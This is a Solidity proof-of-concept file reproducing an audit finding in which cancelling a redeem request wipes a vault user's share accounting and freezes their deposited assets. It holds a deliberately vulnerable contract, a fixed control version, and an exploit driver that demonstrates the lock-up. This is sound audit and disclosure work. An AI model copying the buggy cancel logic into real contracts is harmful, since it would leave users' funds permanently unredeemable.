// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Superform v2-periphery finding 63081:
// "Cancelled redeem requests make shares permanently unredeemable".
//
// SuperVaultStrategy keeps per-controller async-redeem accounting in
// `superVaultState[controller]`. A deposit accumulates the controller's shares
// and cost basis (accumulatorShares / accumulatorCostBasis); a redeem is a
// two-step async flow (requestRedeem -> operator fulfillRedeemRequests). The
// only place these accumulators are ever set is _handleDeposit.
//
// _handleCancelRedeem wipes the ENTIRE struct with `delete
// superVaultState[controller]` instead of clearing only the pending-request
// metadata. This zeroes accumulatorShares/accumulatorCostBasis too. After a
// cancel, the controller can re-request, but the operator's fulfill path
// (_calculateCostBasis) reverts INSUFFICIENT_SHARES() at
// `requestedShares > state.accumulatorShares`, so the shares can NEVER be
// redeemed again — their asset backing is frozen in the strategy forever.
//
// Verbatim vulnerable source pulled from the pre-fix audited state
// (github.com/superform-xyz/v2-periphery @ 5bcdec3c~1 = fadd7ac7; the
// `delete superVaultState[controller]` line is byte-identical up to the fix
// commit 3eaca330 "fix(#45): safe cancel"). The pre-#15 state is used so the
// re-request has no accumulator guard and the harm lands exactly where the
// finding describes: in the fulfill consume path.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math.mulDiv (floor division).
library Math {
    enum Rounding {
        Floor,
        Ceil,
        Trunc,
        Expand
    }

    function mulDiv(uint256 a, uint256 b, uint256 c, Rounding) internal pure returns (uint256) {
        return a * b / c;
    }
}

/// @dev Minimal ERC20 double. Doubles as the vault asset (backing held by the
///      strategy) and as the harm MARKER token (frozen magnitude to the SINK).
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE strategy (verbatim accounting inlined from SuperVaultStrategy.sol,
// pre-fix state; orthogonal machinery — pause/veto/PPS/fees/escrow — stripped).
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVaultStrategy {
    using Math for uint256;

    error ZERO_ADDRESS();
    error INVALID_AMOUNT();
    error REQUEST_NOT_FOUND();
    error INSUFFICIENT_SHARES();

    // Verbatim struct (src/interfaces/SuperVault/ISuperVaultStrategy.sol).
    struct SuperVaultState {
        uint256 pendingRedeemRequest; // Shares requested
        uint256 maxWithdraw; // Assets claimable after fulfillment
        uint256 averageRequestPPS; // Average PPS at the time of redeem request
        uint256 accumulatorShares;
        uint256 accumulatorCostBasis;
        uint256 averageWithdrawPrice; // Average price for claimable assets
    }

    event DepositHandled(address indexed controller, uint256 assets, uint256 shares);
    event RedeemRequestPlaced(address indexed controller, address indexed owner, uint256 shares);
    event RedeemRequestCanceled(address indexed controller, uint256 shares);

    MiniToken public asset;
    mapping(address => SuperVaultState) public superVaultState;

    constructor(address _asset) {
        asset = MiniToken(_asset);
    }

    /// @notice Verbatim _handleDeposit accumulator writes. The ONLY place
    ///         accumulatorShares / accumulatorCostBasis are ever set.
    function handleDeposit(address controller, uint256 assets, uint256 shares) external {
        if (assets == 0 || shares == 0) revert INVALID_AMOUNT();
        if (controller == address(0)) revert ZERO_ADDRESS();

        SuperVaultState storage state = superVaultState[controller];
        state.accumulatorShares += shares;
        state.accumulatorCostBasis += assets;
        emit DepositHandled(controller, assets, shares);
    }

    /// @notice Verbatim _handleRequestRedeem pending accounting (weighted-PPS
    ///         aggregator machinery stripped as out-of-scope).
    function requestRedeem(address controller, uint256 shares) external {
        if (shares == 0) revert INVALID_AMOUNT();
        if (controller == address(0)) revert ZERO_ADDRESS();
        SuperVaultState storage state = superVaultState[controller];

        if (state.pendingRedeemRequest > 0) {
            uint256 existingSharesInRequest = state.pendingRedeemRequest;
            uint256 newTotalSharesInRequest = existingSharesInRequest + shares;
            state.pendingRedeemRequest = newTotalSharesInRequest;
        } else {
            // First request for this controller
            state.pendingRedeemRequest = shares;
        }

        emit RedeemRequestPlaced(controller, controller, shares);
    }

    /// @notice Verbatim _handleCancelRedeem — the bug.
    function cancelRedeem(address controller) external {
        if (controller == address(0)) revert ZERO_ADDRESS();
        SuperVaultState storage state = superVaultState[controller];
        uint256 pendingShares = state.pendingRedeemRequest;
        if (pendingShares == 0) revert REQUEST_NOT_FOUND();
        delete superVaultState[controller]; // @> BUG: wipes accumulatorShares/accumulatorCostBasis, not just the pending request
        emit RedeemRequestCanceled(controller, pendingShares);
    }

    /// @notice Operator fulfill consume path. Verbatim `_calculateCostBasis`
    ///         guard + accumulator drawdown, then pays the assets out.
    function fulfillRedeem(address controller, uint256 requestedShares, address receiver) external {
        SuperVaultState storage state = superVaultState[controller];

        // fulfillRedeemRequests consumes the pending request...
        state.pendingRedeemRequest -= requestedShares;

        // ..._calculateCostBasis (verbatim): reverts because the accumulators
        // were wiped by the earlier cancel.
        if (requestedShares > state.accumulatorShares) revert INSUFFICIENT_SHARES();
        uint256 costBasis = requestedShares.mulDiv(state.accumulatorCostBasis, state.accumulatorShares, Math.Rounding.Floor);
        state.accumulatorShares -= requestedShares;
        state.accumulatorCostBasis -= costBasis;

        // Fulfillment pays the redeemed asset backing to the receiver.
        asset.transfer(receiver, costBasis);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED strategy (negative control): cancel clears ONLY the pending-request
// metadata (fix commit 3eaca330), preserving accumulators so a later
// request -> fulfill succeeds and pays the assets out.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVaultStrategyFixed {
    using Math for uint256;

    error ZERO_ADDRESS();
    error INVALID_AMOUNT();
    error REQUEST_NOT_FOUND();
    error INSUFFICIENT_SHARES();

    struct SuperVaultState {
        uint256 pendingRedeemRequest;
        uint256 maxWithdraw;
        uint256 averageRequestPPS;
        uint256 accumulatorShares;
        uint256 accumulatorCostBasis;
        uint256 averageWithdrawPrice;
    }

    event RedeemRequestCanceled(address indexed controller, uint256 shares);

    MiniToken public asset;
    mapping(address => SuperVaultState) public superVaultState;

    constructor(address _asset) {
        asset = MiniToken(_asset);
    }

    function handleDeposit(address controller, uint256 assets, uint256 shares) external {
        if (assets == 0 || shares == 0) revert INVALID_AMOUNT();
        if (controller == address(0)) revert ZERO_ADDRESS();
        SuperVaultState storage state = superVaultState[controller];
        state.accumulatorShares += shares;
        state.accumulatorCostBasis += assets;
    }

    function requestRedeem(address controller, uint256 shares) external {
        if (shares == 0) revert INVALID_AMOUNT();
        if (controller == address(0)) revert ZERO_ADDRESS();
        SuperVaultState storage state = superVaultState[controller];
        if (state.pendingRedeemRequest > 0) {
            state.pendingRedeemRequest = state.pendingRedeemRequest + shares;
        } else {
            state.pendingRedeemRequest = shares;
        }
    }

    function cancelRedeem(address controller) external {
        if (controller == address(0)) revert ZERO_ADDRESS();
        SuperVaultState storage state = superVaultState[controller];
        uint256 pendingShares = state.pendingRedeemRequest;
        if (pendingShares == 0) revert REQUEST_NOT_FOUND();
        // FIX: only clear pending request metadata; preserve accumulators.
        state.pendingRedeemRequest = 0;
        state.averageRequestPPS = 0;
        emit RedeemRequestCanceled(controller, pendingShares);
    }

    function fulfillRedeem(address controller, uint256 requestedShares, address receiver) external {
        SuperVaultState storage state = superVaultState[controller];
        state.pendingRedeemRequest -= requestedShares;
        if (requestedShares > state.accumulatorShares) revert INSUFFICIENT_SHARES();
        uint256 costBasis = requestedShares.mulDiv(state.accumulatorCostBasis, state.accumulatorShares, Math.Rounding.Floor);
        state.accumulatorShares -= requestedShares;
        state.accumulatorCostBasis -= costBasis;
        asset.transfer(receiver, costBasis);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a user deposits, requests a redeem, cancels it (delete wipes
// the accumulators), re-requests, and the operator's fulfill reverts
// INSUFFICIENT_SHARES — the shares are permanently unredeemable and their asset
// backing is frozen in the strategy. The frozen magnitude is recorded on a
// LOCKED-SHARES marker minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER = 0x0000000000000000000000000000000000000a11;

    uint256 internal constant DEPOSIT_ASSETS = 100 ether; // 100 assets deposited
    uint256 internal constant DEPOSIT_SHARES = 100 ether; // 100 shares minted (1:1)

    // Exposed results for the driver / Playground.
    address public strategyAddr;
    address public assetAddr;
    address public markerAddr;
    bool public fulfillReverted;
    uint256 public lockedInStrategy;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        // --- deploy (fixed order; marker LAST) ---
        MiniToken assetToken = new MiniToken("Vault Asset", "ASSET");        // nonce 1
        SuperVaultStrategy strat = new SuperVaultStrategy(address(assetToken)); // nonce 2
        MiniToken marker = new MiniToken("Locked Shares", "LOCKED-SHARES");  // nonce 3 (LAST)

        strategyAddr = address(strat);
        assetAddr = address(assetToken);
        markerAddr = address(marker);

        // The user's asset backing lives in the strategy (would be paid out on a
        // successful fulfill).
        assetToken.mint(address(strat), DEPOSIT_ASSETS);

        // --- REAL buggy sequence ---
        strat.handleDeposit(USER, DEPOSIT_ASSETS, DEPOSIT_SHARES); // accumulators set
        strat.requestRedeem(USER, DEPOSIT_SHARES);                 // pending set
        strat.cancelRedeem(USER);                                  // BUG: delete wipes accumulators
        strat.requestRedeem(USER, DEPOSIT_SHARES);                 // re-request succeeds (no accumulator guard)

        // Operator fulfillment now reverts INSUFFICIENT_SHARES.
        try strat.fulfillRedeem(USER, DEPOSIT_SHARES, USER) {
            fulfillReverted = false;
        } catch {
            fulfillReverted = true;
        }
        require(fulfillReverted, "harm not reproduced: fulfill did not revert");

        // Accumulators are truly wiped (delete zeroed them).
        (,,, uint256 accShares, uint256 accCostBasis,) = strat.superVaultState(USER);
        require(accShares == 0 && accCostBasis == 0, "accumulators not wiped");

        // The user's full asset backing is frozen in the strategy forever.
        lockedInStrategy = assetToken.balanceOf(address(strat));
        require(lockedInStrategy == DEPOSIT_ASSETS, "asset backing not frozen");

        // Record the frozen magnitude on the LOCKED-SHARES marker to the SINK.
        marker.mint(SINK, DEPOSIT_SHARES);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
